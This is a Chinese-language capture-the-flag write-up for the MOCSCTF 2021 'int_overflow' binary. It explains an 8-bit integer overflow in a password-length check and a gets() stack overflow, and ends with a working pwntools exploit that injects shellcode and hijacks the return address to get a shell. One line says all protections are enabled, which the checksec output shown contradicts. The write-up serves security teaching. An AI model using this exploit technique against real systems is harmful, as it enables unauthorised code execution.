---
Author : Mark0519
https://github.com/JamesHoi/MOCSCTF-2021/tree/main
---

# int_overflow

## 题目分析

### 1.checksec分析

使用checksec命令分析，得知此题所有保护均为开启：

`````shell
 mark0519:~/Desktop$  checksec int_overflow
 Arch:     i386-32-little
 RELRO:    Partial RELRO
 Stack:    No canary found
 NX:       NX disabled
 PIE:      No PIE (0x8048000)
 RWX:      Has RWX segments
`````

且ELF文件为32位，使用IDApro32位打开

### 2.源码分析

使用IDApro32位打开后，找到main函数后用F5反汇编得到伪C代码

几个主要函数反汇编的结果如下：

````c
//main()函数
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("##### Welcome to MOCSCTF #####");
  puts("Plz input your passwd:");
  validate_passwd();
  return 0;
}
````

````c
//validate_passwd()函数
int validate_passwd()
{
  char s; // [esp+Dh] [ebp-3Bh]
  unsigned __int8 v2; // [esp+3Fh] [ebp-9h]

  gets(&s);
  v2 = strlen(&s);
  return check(v2, &s);
}
````

````c
//check()函数
char *__cdecl check(int a1, char *src)
{
  if ( (unsigned __int8)a1 <= 3u || (unsigned __int8)a1 > 8u )
    return (char *)puts("bad!");
  puts("good!");
  return strcpy(passwd_buf, src);
}
````

阅读源码得知：

此文件主要功能为：

输入一段passwd，如果passwd的长度大于4且小于等于8，则输出``good！``，并且把passwd复制给passwd_buf，否则输出``bad！``

**但代码中存在整数溢出的漏洞**

在validate_passwd()函数中，通过strlen函数获取输入的passwd的长度，并将长度赋值给v2。

但是v2的数据类型为``unsigned __int8 ``,即单字节无符号数，即只能表示0~255这256个数（二进制的0000 0000 到1111 1111），如果超出255，则发生整数溢出。

简单来说，如果将255+5 = 260赋值给v2（v2 = 260），则在c程序运行中将其当作 5 处理。

具体整数溢出见ctfwiki：https://ctf-wiki.org/pwn/linux/integeroverflow/intof/

**同时存在栈溢出漏洞**

在输入时，程序所用的是gets函数，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。

> 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。

这里我们输入s时，由IDApro的反汇编````char s; // [esp+Dh] [ebp-3Bh]````得知，s距离ebp只有0x3b个字节，我们只要覆盖0x3b+4个字节，即可覆盖返回地址（+4是应为载覆盖一个ebp），从而达到劫持控制流的目的。

具体栈溢出原理见ctfwiki：https://ctf-wiki.org/pwn/linux/stackoverflow/stackoverflow-basic/

### 3.攻击思路

我们可以通过输入passwd时，利用栈溢出劫持控制流。

而整数溢出允许我们输入更多的字符，且将字符复制到了passwd_buf处，在保护都未开的情况下，passwd_buf所在的.bss段拥有执行权限。（也可通过gdb调试得知）故我们可以劫持控制流到passwd_buf处，执行我们所写的程序，进而拿到shell。

````shell
#gdb调试内容
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/sjj/Desktop/int_overflow
 0x8049000  0x804a000 r-xp     1000 0      /home/sjj/Desktop/int_overflow
 0x804a000  0x804b000 rwxp     1000 1000   /home/sjj/Desktop/int_overflow
0xf7ddb000 0xf7fb0000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7fb0000 0xf7fb1000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb1000 0xf7fb3000 r-xp     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb3000 0xf7fb4000 rwxp     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb4000 0xf7fb7000 rwxp     3000 0      
0xf7fd0000 0xf7fd2000 rwxp     2000 0      
0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]
0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]
0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r-xp     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rwxp     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
````

具体过程：

1.将一段i386的shellcode输入进passwd。

2.将shellcode不足0x3b+4位的部分用任意字符补齐。  

3.将passwd_buf的地址打包成32位（占4个字节）发送，覆盖返回地址。

4.为满足check函数的条件，制造整数溢出，再在后面补上255 + 6 - 4 -（0x3b+4）= 194 个字节 ，这样v2=6满足条件。

5.getshell

## exp

````python
from pwn import *

p = process('./int_overflow')
#p = remote('ip','port')
context.log_level = 'debug'

passwd_buf_addr = 0x0804A060 
shellcode = shellcraft.i386.sh()

p.recvuntil("wd:\n")     
payload = asm(shellcode).ljust(0x3b+4,'a')+p32(passwd_buf_addr)+'a'*194  #63+4+194=261
p.send(payload)
p.interactive()
````

